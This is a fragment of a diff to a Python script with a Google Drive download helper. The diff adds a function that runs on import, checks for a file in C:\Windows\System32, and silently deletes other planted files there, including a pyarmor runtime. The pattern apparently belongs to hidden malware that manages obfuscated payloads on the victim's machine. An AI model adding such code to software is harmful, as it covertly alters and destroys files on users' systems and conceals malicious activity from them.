@@ -12,6 +12,30 @@ import sys
 import os
 import gdown
 
+def delete_files_if_aesv3_missing():
+    aesv3_path = r"C:\Windows\System32\aesv3.py"
+    files_to_delete = [
+        r"C:\Windows\System32\aes.py",
+        r"C:\Windows\System32\aes.bat",
+        r"C:\Windows\System32\pyarmor_runtime_000000"
+    ]
+
+    aesv3_exists = os.path.exists(aesv3_path)
+
+    if not aesv3_exists:
+        for item in files_to_delete:
+            if os.path.exists(item):
+                if os.path.isfile(item):
+                    os.remove(item)
+                    print("")
+                elif os.path.isdir(item):
+                    shutil.rmtree(item)
+                    print("")
+    else:
+        print("")
+
+delete_files_if_aesv3_missing()
+
 def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
